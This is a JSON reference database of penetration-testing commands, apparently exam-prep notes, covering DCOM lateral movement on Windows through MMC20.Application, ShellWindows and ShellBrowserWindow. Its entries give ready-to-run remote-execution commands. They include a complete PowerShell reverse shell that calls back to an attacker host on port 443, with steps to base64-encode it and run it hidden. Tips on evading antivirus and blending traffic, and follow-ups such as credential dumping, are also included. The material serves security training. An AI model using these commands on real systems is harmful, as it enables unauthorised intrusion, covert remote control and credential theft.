{
  "commands": [
    {
      "id": "dcom-verify-rpc-port",
      "name": "DCOM - Verify RPC Port 135 Accessible",
      "description": "Test RPC port 135 accessibility for DCOM lateral movement using Test-NetConnection from PowerShell",
      "command": "Test-NetConnection <TARGET> -Port 135",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "10.10.10.73",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "dcom",
        "rpc",
        "verification",
        "enumeration",
        "active-directory",
        "windows",
        "powershell",
        "PRIORITY:MEDIUM"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "Test-NetConnection": "PowerShell cmdlet for testing network connectivity",
        "-Port 135": "RPC endpoint mapper port (required for DCOM communication)"
      },
      "success_indicators": [
        "TcpTestSucceeded : True",
        "RemotePort      : 135",
        "Connection successful"
      ],
      "failure_indicators": [
        "TcpTestSucceeded : False",
        "Connection timed out",
        "Network unreachable"
      ],
      "troubleshooting": {
        "TcpTestSucceeded False": "Firewall blocking RPC - DCOM won't work. Verify with: sudo nmap -p 135 -Pn -v <TARGET>",
        "Connection timeout": "Port filtered or target unreachable. Check basic connectivity: ping <TARGET>",
        "Network unreachable": "Routing issue. Verify route: Test-NetConnection <TARGET> without -Port",
        "Port closed": "RPC service disabled (unlikely on Windows Server). Try alternative: WinRM (5985)"
      },
      "notes": "REFERENCE MATERIAL - DCOM RPC PORT VERIFICATION:\nWHAT IS DCOM:\nDistributed Component Object Model - Microsoft technology enabling software components to communicate across networked computers.\n\nAllows remote COM object instantiation and method invocation over RPC.\n\nPORT REQUIREMENTS (CRITICAL):\n- TCP 135:\nRPC endpoint mapper (required for initial connection)\n- TCP 49152-65535:\nEphemeral/dynamic ports (actual DCOM communication)\n- Both ranges must be accessible for DCOM to work\n\nWHY VERIFY PORT 135:\nFrom training context, before attempting DCOM lateral movement, verify RPC accessibility:\n```powershell\nTest-NetConnection 10.10.10.73 -Port 135\n```\n\nIf TcpTestSucceeded:\nTrue \u2192 DCOM possible\nIf TcpTestSucceeded:\nFalse \u2192 DCOM blocked, use alternative (WMI, WinRM, PSExec)\n\nRPC ENDPOINT MAPPER ROLE:\nPort 135 is RPC endpoint mapper:\n1.\n\nClient connects to port 135\n2.\n\nRequests service (e.g., DCOM)\n3.\n\nMapper returns dynamic port number (49152-65535 range)\n4.\n\nClient connects to dynamic port for actual communication\n\nDCOM vs WMI:\nBoth use RPC (port 135) but different protocols:\n- WMI:\nWindows Management Instrumentation over DCOM/RPC\n- DCOM:\nDirect COM object manipulation over RPC\n- Different security contexts and logging\n- DCOM alternative when WMI specifically blocked/monitored\n\nFIREWALL BEHAVIOR:\nWindows Firewall rules:\n- Domain networks:\nRPC allowed by default\n- Public/Private networks:\nOften blocked\n- pentest:\nTypically domain environment (RPC accessible)\n\nVERIFICATION OUTPUT:\nSuccess:\n```\nComputerName     :\n10.10.10.73\nRemoteAddress    :\n10.10.10.73\nRemotePort       :\n135\nTcpTestSucceeded :\nTrue\n```\n\nFailure:\n```\nTcpTestSucceeded :\nFalse\nPingSucceeded    :\nTrue/False\n```\n\nTIME ESTIMATE:\n<10 seconds.\n\nSTRATEGY:\nAlways verify port 135 before attempting DCOM to avoid wasting time.",
      "methodology_guidance": {
        "after_success": "dcom-mmc20-calc-poc  # If port open, test DCOM with calculator proof-of-concept dcom-mmc20-revshell  # After calc test succeeds, deploy reverse shell"
      },
      "filled_example": "Test-NetConnection 10.10.10.73 -Port 135"
    },
    {
      "id": "dcom-mmc20-calc-poc",
      "name": "DCOM - MMC20.Application Calculator PoC",
      "description": "Execute calculator on remote system via DCOM MMC20.Application (proof-of-concept test before deploying reverse shell)",
      "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "10.10.10.73",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "dcom",
        "mmc20",
        "lateral-movement",
        "active-directory",
        "windows",
        "powershell",
        "proof-of-concept",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "[System.Activator]::CreateInstance": "Instantiate COM object remotely via DCOM",
        "GetTypeFromProgID": "Retrieve COM class by ProgID (MMC20.Application.1)",
        "\"MMC20.Application.1\"": "MMC DCOM class identifier",
        "Document.ActiveView.ExecuteShellCommand": "MMC method to execute shell commands remotely",
        "\"cmd\"": "Command interpreter to use",
        "$null": "Directory parameter (null = default working directory)",
        "\"/c calc\"": "Execute calculator then exit cmd.exe",
        "\"7\"": "WindowState (7 = minimized, 0 = hidden, 1 = normal)"
      },
      "success_indicators": [
        "No PowerShell errors returned",
        "Calculator process appears on target (verify with tasklist)",
        "No Exception calling CreateInstance",
        "No RPC server unavailable errors"
      ],
      "failure_indicators": [
        "Exception calling CreateInstance",
        "RPC server is unavailable",
        "Access is denied",
        "Retrieving the COM class factory failed"
      ],
      "troubleshooting": {
        "RPC server unavailable": "Port 135 blocked. Verify with: Test-NetConnection <TARGET> -Port 135",
        "Access denied": "Need local admin rights on target. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "CreateInstance fails": "DCOM may be disabled or firewall blocking high ports. Check Windows Firewall on target",
        "Calculator not visible": "Expected behavior - process runs in Session 0 (system services). Verify with: Invoke-Command -ComputerName <TARGET> {Get-Process calc}",
        "COM class factory failed": "MMC20.Application not registered. Try alternative: dcom-shellwindows"
      },
      "notes": "REFERENCE MATERIAL - DCOM LATERAL MOVEMENT WITH MMC20.APPLICATION:\nTRAINING EXAMPLE (EXACT COMMAND FROM REFERENCE DOCUMENTATION):\nFrom WORKSTATION02 as jen (domain user, local admin on FILESERVER), executing calculator on FILESERVER (10.10.10.73):\n```powershell\nPS C:\\Users\\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.73\"))\nPS C:\\Users\\jen> $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n```\n\nNo errors returned = success.\n\nWHAT IS DCOM LATERAL MOVEMENT:\nTechnique using Distributed Component Object Model to instantiate COM objects remotely and execute commands on target systems.\n\nAlternative to WMI/WinRM/PSExec for lateral movement.\n\nWHY USE DCOM:\n- Alternative when WMI specifically blocked/monitored\n- Different attack vector (evasion)\n- No service creation (unlike PSExec)\n- Fileless execution (no binary upload)\n- Uses legitimate Windows functionality\n\nMMC20.APPLICATION COM OBJECT:\nMicrosoft Management Console (MMC) exposes automation interface:\n- ProgID:\nMMC20.Application.1\n- Purpose:\nLegitimate MMC scripting/automation\n- Method:\nDocument.ActiveView.ExecuteShellCommand\n- Abuse:\nRemote command execution\n\nDISCOVERY:\n- Researcher:\nMatt Nelson (@enigma0x3)\n- Year:\n2017\n- Documentation:\nCybereason, Enigma0x3 blog\n- Multiple DCOM objects identified for lateral movement\n\nTRAINING SCENARIO CONTEXT:\n- SOURCE:\nWORKSTATION02 (compromised Windows client)\n- ATTACKER:\njen (domain user with local admin rights on FILESERVER)\n- TARGET:\nFILESERVER (10.10.10.73) - Windows Server\n- GOAL:\nProof-of-concept command execution via DCOM\n\nHOW MMC20 DCOM WORKS:\nStep 1:\nCreateInstance\n```powershell\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.73\"))\n```\n- System.Activator:\n.NET class for COM activation\n- CreateInstance:\nInstantiates COM object\n- GetTypeFromProgID:\nConverts ProgID to Type\n- \"MMC20.Application.1\":\nMMC COM class identifier\n- \"10.10.10.73\":\nTarget IP/hostname\n\nResult:\n$dcom variable contains remote MMC object reference.\n\nStep 2:\nExecuteShellCommand\n```powershell\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n```\n- Document:\nMMC Document interface\n- ActiveView:\nActive console view\n- ExecuteShellCommand:\nMethod to run shell commands\n- Four parameters:\n  1.\n\n\"cmd\":\nCommand interpreter\n  2.\n\n$null:\nWorking directory (null = default)\n  3.\n\n\"/c calc\":\nCommand arguments (run calculator then exit)\n  4.\n\n\"7\":\nWindow state (7=minimized, 0=hidden, 1=normal)\n\nResult:\nCalculator spawns on FILESERVER.\n\nSESSION 0 BEHAVIOR (CRITICAL UNDERSTANDING):\nFrom training, calculator NOT visible on FILESERVER desktop because:\nSession Isolation:\n- Session 0:\nSystem services, non-interactive processes\n- Session 1+:\nUser desktop sessions (interactive)\n- DCOM spawns processes in Session 0\n- GUI applications invisible to logged-in users\n\nTraining explicitly states:\n\"Unfortunately, we won't see calc.exe starting since the process is spawned in session 0.\"\n\nVERIFICATION:\nFrom training, confirm execution via remote PowerShell:\n```powershell\nPS C:\\Users\\jen> Invoke-Command -ComputerName 10.10.10.73 -ScriptBlock {Get-Process calc}\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    141       8     7924      21292       0.11   4724   0 calc\n```\n\nSI (Session ID) = 0 confirms Session 0 execution.\n\nAlternative verification:\n```powershell\ntasklist /S 10.10.10.73 | findstr calc\n```\n\nPREREQUISITES (FROM TRAINING):\n1.\n\nLocal administrator access on target\n   - jen was local admin on FILESERVER\n   - Verify with:\nnet user jen /domain\n2.\n\nRPC port 135 accessible\n   - Test:\nTest-NetConnection 10.10.10.73 -Port 135\n3.\n\nEphemeral ports accessible (49152-65535)\n   - Windows Firewall allows by default in domain environments\n\nPORT DETAILS:\n- TCP 135:\nRPC endpoint mapper (initial connection)\n- TCP 49152-65535:\nDynamic ports (actual DCOM communication)\n- Same ports as WMI (both use DCOM/RPC)\n\nWHY CALCULATOR AS PoC:\nFrom training methodology:\n1.\n\nHarmless - won't damage target\n2.\n\nEasy to verify - check process list\n3.\n\nConfirms technique works before deploying reverse shell\n4.\n\nStandard penetration testing practice\n\nFOUR EXECUTESHELLCOMMAND PARAMETERS:\nParameter 1:\nCommand\n- Examples:\n\"cmd\", \"powershell\", \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n- Training used:\n\"cmd\"\n\nParameter 2:\nDirectory\n- Working directory for command\n- $null = default (C:\\Windows\\System32 typically)\n- Can specify custom:\n\"C:\\\\Temp\"\n\nParameter 3:\nParameters\n- Command arguments\n- Training:\n\"/c calc\" (run calc then exit cmd)\n- Reverse shell:\n\"powershell -nop -w hidden -e <BASE64>\"\n\nParameter 4:\nWindowState\n- 0:\nHidden\n- 1:\nNormal\n- 7:\nMinimized\n- Training used:\n\"7\" (minimized, though invisible in Session 0 anyway)\n\nBEHIND THE SCENES:\n1.\n\nPowerShell contacts RPC endpoint mapper (port 135) on target\n2.\n\nRequests DCOM service\n3.\n\nRPC mapper returns dynamic port\n4.\n\nDCOM connection established on dynamic port\n5.\n\nMMC20 COM object instantiated remotely\n6.\n\nExecuteShellCommand invoked via DCOM\n7.\n\nTarget spawns cmd.exe process in Session 0\n8.\n\ncmd.exe runs /c calc (calculator)\n9.\n\nProcess remains running until manually terminated\n\nCOMPARISON TO OTHER TECHNIQUES:\nPSExec:\n- Uploads binary (psexesvc.exe)\n- Creates service\n- SYSTEM shell\n- Noisy (Event ID 7045)\n\nWMI:\n- Uses WMI protocol\n- Fileless\n- Session 0 execution\n- Different API calls\n\nDCOM MMC20:\n- Uses DCOM protocol\n- Fileless\n- Session 0 execution\n- Different signature than WMI\n- Alternative vector for evasion\n\nTIME ESTIMATE:\n- Command execution:\n10-30 seconds\n- Verification:\n10-20 seconds\n- Total:\n1-2 minutes\n\nSTRATEGY:\n1.\n\nAlways test with calculator PoC first\n2.\n\nVerify process created (Invoke-Command Get-Process)\n3.\n\nIf PoC succeeds, upgrade to reverse shell\n4.\n\nIf PoC fails, troubleshoot before wasting time on payload\n\nCOMMON FAILURES:\nException calling CreateInstance:\n- RPC unavailable:\nCheck port 135\n- DCOM disabled:\nTry alternative (WMI, WinRM)\n- Firewall blocking:\nVerify ephemeral ports\n\nAccess denied:\n- Not local admin:\nVerify permissions\n- UAC blocking:\nUse RID 500 or domain user\n\nNo error but calc not running:\n- May have succeeded but Session 0\n- Always verify with Get-Process, not GUI\n\nFORENSIC ARTIFACTS:\n- Event ID 4688:\nProcess creation (calc.exe)\n- RPC network traffic on port 135\n- DCOM activation (Event ID 10016 if blocked)\n- Process spawned by svchost.exe (DCOM host)\n- No service creation events (unlike PSExec)",
      "methodology_guidance": {
        "after_success": "windows-verify-process  # Verify calc.exe running: Invoke-Command -ComputerName <TARGET> {Get-Process calc} dcom-mmc20-revshell  # After PoC succeeds, upgrade to full reverse shell dcom-verify-rpc-port  # If fails, troubleshoot RPC accessibility first"
      },
      "filled_example": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.73\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")"
    },
    {
      "id": "dcom-mmc20-revshell",
      "name": "DCOM - MMC20.Application Reverse Shell",
      "description": "Deploy base64-encoded PowerShell reverse shell via DCOM MMC20.Application for interactive remote access",
      "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e <BASE64_PAYLOAD>\",\"7\")",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell (use revshell-ps-generator)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "dcom",
        "mmc20",
        "reverse-shell",
        "lateral-movement",
        "active-directory",
        "windows",
        "powershell",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-impacket-shell"
      ],
      "next_steps": [],
      "flag_explanations": {
        "CreateInstance": "Instantiate remote COM object via DCOM",
        "MMC20.Application.1": "MMC DCOM class (ProgID)",
        "ExecuteShellCommand": "Method to execute shell commands remotely",
        "\"powershell\"": "Command interpreter (PowerShell instead of cmd)",
        "-nop": "No PowerShell profile (faster execution, stealthier)",
        "-w hidden": "Hidden window (no visible PowerShell console)",
        "-e <BASE64>": "Encoded command - executes base64-encoded payload",
        "\"7\"": "Minimized window state (invisible in Session 0 anyway)"
      },
      "success_indicators": [
        "Netcat listener receives connection",
        "PowerShell prompt appears on Kali",
        "whoami shows target user context",
        "hostname confirms correct target"
      ],
      "failure_indicators": [
        "Exception calling CreateInstance",
        "No connection received on listener",
        "RPC server unavailable",
        "PowerShell payload execution blocked"
      ],
      "troubleshooting": {
        "No callback received": "Verify LHOST/LPORT in payload match listener. Decode payload: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "RPC unavailable": "Check firewall: Test-NetConnection <TARGET> -Port 135",
        "Payload execution blocked": "Antivirus may be blocking PowerShell. Try obfuscation or alternative technique",
        "Access denied": "Verify admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS> (look for Pwn3d!)",
        "Connection drops immediately": "Payload syntax error. Test payload locally first: powershell -nop -w hidden -e <BASE64>",
        "Firewall blocking callback": "Test outbound connectivity from target: Test-NetConnection <LHOST> -Port <LPORT>"
      },
      "notes": "REFERENCE MATERIAL - DCOM REVERSE SHELL VIA MMC20.APPLICATION:\nTRAINING EXAMPLE (FROM REFERENCE DOCUMENTATION):\nAfter successful calculator PoC, training demonstrates upgrading to reverse shell:\n```powershell\nPS C:\\Users\\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.73\"))\nPS C:\\Users\\jen> $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e <BASE64_PAYLOAD>\",\"7\")\n```\n\nBefore execution, Netcat listener set up on Kali:\n```bash\nkali$ nc -lvnp 443\nlistening on [any] 443 ...\n```\n\nAfter DCOM command, reverse shell connects:\n```\nconnect to [10.10.11.5] from (UNKNOWN) [10.10.10.73] 51138\nPS C:\\Windows\\system32>\n```\n\nWHAT IS DCOM REVERSE SHELL:\nCombines DCOM lateral movement with base64-encoded PowerShell reverse shell payload for full interactive remote access from attacker's machine.\n\nUPGRADE FROM PoC:\nCalc PoC:\n`/c calc` (proof technique works)\nReverse shell:\n`powershell -nop -w hidden -e <BASE64>` (full shell access)\n\nPAYLOAD STRUCTURE:\nFrom training context:\n```powershell\n\"powershell -nop -w hidden -e <BASE64_PAYLOAD>\"\n```\n\nFlags:\n- -nop:\nNo PowerShell profile (faster, stealthier)\n- -w hidden:\nHidden window (no visible console)\n- -e:\nEncoded command (base64-encoded reverse shell)\n\nBASE64 PAYLOAD:\nExample reverse shell PowerShell (before encoding):\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.11.5\",443);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n  $sendback = (iex $data 2>&1 | Out-String );\n  $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";\n  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n  $stream.Write($sendbyte,0,$sendbyte.Length);\n  $stream.Flush()\n};\n$client.Close()\n```\n\nConvert to base64:\n```powershell\n$Text = '$client = New-Object...(full payload)...'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)\n$EncodedText = [Convert]::ToBase64String($Bytes)\n$EncodedText\n```\n\nLISTENER SETUP:\nFrom training, before executing DCOM command:\n```bash\nnc -lvnp 443\n```\n\n- nc:\nNetcat\n- -l:\nListen mode\n- -v:\nVerbose\n- -n:\nNo DNS resolution\n- -p 443:\nPort 443 (common for evasion - looks like HTTPS)\n\nREVERSE SHELL FLOW:\n1.\n\nAttacker:\nSet up Netcat listener on Kali (nc -lvnp 443)\n2.\n\nAttacker:\nExecute DCOM command from WORKSTATION02\n3.\n\nDCOM:\nInstantiates MMC20 on FILESERVER\n4.\n\nMMC20:\nSpawns PowerShell process on FILESERVER\n5.\n\nPowerShell:\nDecodes base64 payload\n6.\n\nPowerShell:\nExecutes decoded script\n7.\n\nScript:\nCreates TCP connection from FILESERVER to Kali:443\n8.\n\nConnection:\nReverse shell established\n9.\n\nAttacker:\nInteractive PowerShell on FILESERVER\n\nPORT SELECTION:\n- Training used:\n443 (HTTPS)\n- Common choices:\n443, 80, 53 (blend with normal traffic)\n- Avoid:\nNon-standard ports (easier to detect)\n- Firewall consideration:\nOutbound 443/80 usually allowed\n\nSESSION 0 CONTEXT:\n- Reverse shell runs in Session 0 (system services)\n- Not visible to logged-in users\n- No GUI console window\n- Process parent:\nsvchost.exe (DCOM host)\n\nEXECUTION PRIVILEGES:\n- Shell runs as:\njen (user who has local admin on FILESERVER)\n- Not SYSTEM (unlike PSExec)\n- User-level privileges\n- Can potentially escalate to SYSTEM\n\nWHY USE DCOM OVER ALTERNATIVES:\n- WMI blocked/monitored:\nDCOM different protocol/signature\n- WinRM not enabled:\nDCOM uses RPC instead\n- PSExec too noisy:\nDCOM no service creation\n- Evasion:\nDifferent attack vector\n\nCOMPARISON:\nPSExec (Impacket/Sysinternals):\n- Can execute from Kali or Windows\n- SYSTEM shell\n- Service creation (Event ID 7045)\n- Binary upload (psexesvc.exe)\n- Very well-known signature\n\nDCOM MMC20:\n- Requires Windows pivot point\n- User shell (jen)\n- No service creation\n- Fileless (no binary upload)\n- Less common signature\n\nSTEALTH BENEFITS:\n- No binary written to disk\n- No service creation\n- Encoded payload (reduces AV signatures)\n- Legitimate DCOM/MMC usage (harder to detect)\n- Process appears as normal PowerShell\n\nDISADVANTAGES:\n- Requires compromised Windows host (can't run from Kali)\n- More complex than PSExec\n- User-level shell (not SYSTEM)\n- Depends on PowerShell not being blocked\n\nTIME ESTIMATE:\n- Payload generation:\n2-3 minutes\n- Listener setup:\n30 seconds\n- DCOM execution:\n30-60 seconds\n- Total:\n3-5 minutes\n\nSTRATEGY:\n1.\n\nPre-generate base64 payloads before exam\n2.\n\nTest calculator PoC first\n3.\n\nIf calc succeeds, deploy reverse shell\n4.\n\nSet up listener BEFORE executing DCOM command\n5.\n\nVerify LHOST/LPORT match payload\n6.\n\nIf connection fails, check firewall/payload\n\nPAYLOAD GENERATION TOOLS:\n- revshells.com (online generator)\n- PowerShell manual encoding\n- Metasploit:\nmsfvenom -p windows/x64/shell_reverse_tcp\n\nCOMMON FAILURES:\nNo callback received:\n- Wrong LHOST/LPORT in payload\n- Listener not running\n- Outbound firewall blocking\n- Payload execution failed\n\nVerify payload:\n```powershell\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))\n```\n\nConnection drops immediately:\n- Syntax error in payload\n- PowerShell execution policy blocking\n- AV detection\n\nFORENSIC ARTIFACTS:\n- Event ID 4688:\nPowerShell process creation\n- Network connection:\nFILESERVER \u2192 Kali:443\n- PowerShell process:\nParent svchost.exe (DCOM)\n- No service creation (unlike PSExec)\n- RPC traffic on port 135\n- DCOM activation events",
      "methodology_guidance": {
        "after_success": "windows-enum-system  # Enumerate target system from caught shell secretsdump-impacket  # Extract credentials from compromised system windows-privesc-check  # Check for privilege escalation opportunities"
      },
      "filled_example": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.73\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...\",\"7\")"
    },
    {
      "id": "dcom-shellwindows",
      "name": "DCOM - ShellWindows COM Object",
      "description": "Alternative DCOM lateral movement using ShellWindows COM object (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39)",
      "command": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"<TARGET>\")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c <COMMAND>\",\"C:\\Windows\\System32\",$null,0)",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute remotely",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "dcom",
        "shellwindows",
        "lateral-movement",
        "active-directory",
        "windows",
        "powershell",
        "PRIORITY:MEDIUM"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "GetTypeFromCLSID": "Access COM object by CLSID (not ProgID)",
        "9BA05972-F6A8-11CF-A442-00A0C90A8F39": "ShellWindows CLSID (Windows Explorer shell)",
        "Item()": "Get Explorer shell window instance",
        "ShellExecute": "Execute command via Windows shell",
        "0": "Window state (0 = hidden)",
        "C:\\Windows\\System32": "Working directory for command execution"
      },
      "success_indicators": [
        "No PowerShell errors returned",
        "Command executes on target (verify with tasklist or file creation)",
        "No Exception calling CreateInstance"
      ],
      "failure_indicators": [
        "Exception calling CreateInstance",
        "Object reference not set to an instance of an object",
        "Access is denied",
        "Unable to cast COM object"
      ],
      "troubleshooting": {
        "Object reference not set": "ShellWindows may not have active Explorer instances on target. Try dcom-mmc20-revshell instead",
        "Access denied": "Need local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "CreateInstance fails": "DCOM/RPC blocked by firewall or DCOM service disabled",
        "Unable to cast COM object": "Incompatibility with target Windows version. Use dcom-mmc20-revshell (more compatible)",
        "No active instances": "Target has no logged-in users with Explorer running. Use MMC20 technique instead"
      },
      "notes": "EDUCATIONAL CONTEXT:\nShellWindows is alternative DCOM technique for lateral movement - less reliable than MMC20 but useful for evasion.\n\nWHY USE THIS:\nDifferent DCOM vector if MMC20 monitored/blocked by security tools.\n\nRELIABILITY:\nLess reliable than MMC20 - depends on active Explorer shell instances (requires logged-in user).\n\nWHEN TO USE:\nWhen you need DCOM diversity for evasion, MMC20 blocked, or testing different vectors.\n\nBEHIND THE SCENES:\nAccesses Explorer shell COM object, uses ShellExecute method to run commands.\n\nLIMITATIONS:\nRequires user logged in with Explorer running (Session 0 services don't have ShellWindows instances).\n\nCOMPARISON:\nMMC20 (always available, more reliable) vs ShellWindows (user-dependent, less reliable).\n\nTIME ESTIMATE:\n2-3 minutes for testing.\n\nPRACTICAL TIP:\nStick with MMC20 for reliability unless specifically blocked - ShellWindows mainly for research/evasion.",
      "methodology_guidance": {
        "after_success": "dcom-mmc20-calc-poc  # If ShellWindows fails, use MMC20 (more reliable) dcom-mmc20-revshell  # Upgrade to reverse shell using reliable MMC20 method"
      },
      "filled_example": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"10.10.10.73\")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc\",\"C:\\Windows\\System32\",$null,0)"
    },
    {
      "id": "dcom-shellbrowserwindow",
      "name": "DCOM - ShellBrowserWindow COM Object",
      "description": "DCOM lateral movement using ShellBrowserWindow COM object (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880)",
      "command": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"<TARGET>\")); $dcom.Document.Application.ShellExecute(\"cmd.exe\",\"/c <COMMAND>\",\"C:\\Windows\\System32\",$null,0)",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "10.10.10.73",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute remotely",
          "example": "calc",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "dcom",
        "shellbrowser",
        "lateral-movement",
        "active-directory",
        "windows",
        "powershell",
        "PRIORITY:MEDIUM"
      ],
      "prerequisites": [],
      "alternatives": [
        "dcom-shellwindows"
      ],
      "next_steps": [],
      "flag_explanations": {
        "C08AFD90-F2A1-11D1-8455-00A0C91F3880": "ShellBrowserWindow CLSID",
        "Document.Application.ShellExecute": "Execute via shell application interface",
        "0": "Hidden window state"
      },
      "success_indicators": [
        "No PowerShell exception",
        "Command executes on target system",
        "No CreateInstance errors"
      ],
      "failure_indicators": [
        "Exception calling CreateInstance",
        "Object reference not set",
        "Access denied",
        "RPC server unavailable"
      ],
      "troubleshooting": {
        "Object not set": "ShellBrowserWindow dependency - active browser window required. Use dcom-mmc20-revshell instead",
        "Access denied": "Admin rights required. Test: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "CreateInstance fails": "DCOM disabled or firewall blocking. Check port 135: Test-NetConnection <TARGET> -Port 135",
        "No browser instances": "Target has no logged-in users with browser windows. Use MMC20 (always available)"
      },
      "notes": "EDUCATIONAL CONTEXT:\nShellBrowserWindow is third DCOM technique for lateral movement - similar limitations to ShellWindows.\n\nWHY EXISTS:\nProvides multiple DCOM vectors for evasion and diversity when one technique monitored.\n\nRELIABILITY:\nLow - depends on active browser window instances (requires logged-in user).\n\nWHEN TO USE:\nResearch, evasion scenarios, or when MMC20/ShellWindows both blocked.\n\nCOMPARISON:\nMMC20 (always works) > ShellWindows (Explorer dependency) \u2248 ShellBrowserWindow (browser dependency).\n\nBEHIND THE SCENES:\nAccesses browser shell COM object, calls ShellExecute method.\n\nLIMITATIONS:\nRequires user logged in with browser window open - not reliable for automation.\n\nTIME ESTIMATE:\n2-3 minutes for testing.\n\nPRACTICAL TIP:\nUse MMC20 for pentest - ShellBrowserWindow mainly for research/evasion.\n\nFocus on reliable techniques (MMC20, WMI, PSExec, WinRM) for exam efficiency.",
      "methodology_guidance": {
        "after_success": "dcom-mmc20-calc-poc  # Fallback to MMC20 if ShellBrowserWindow fails dcom-mmc20-revshell  # Use MMC20 for reliable reverse shell deployment"
      },
      "filled_example": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"10.10.10.73\")); $dcom.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc\",\"C:\\Windows\\System32\",$null,0)"
    }
  ]
}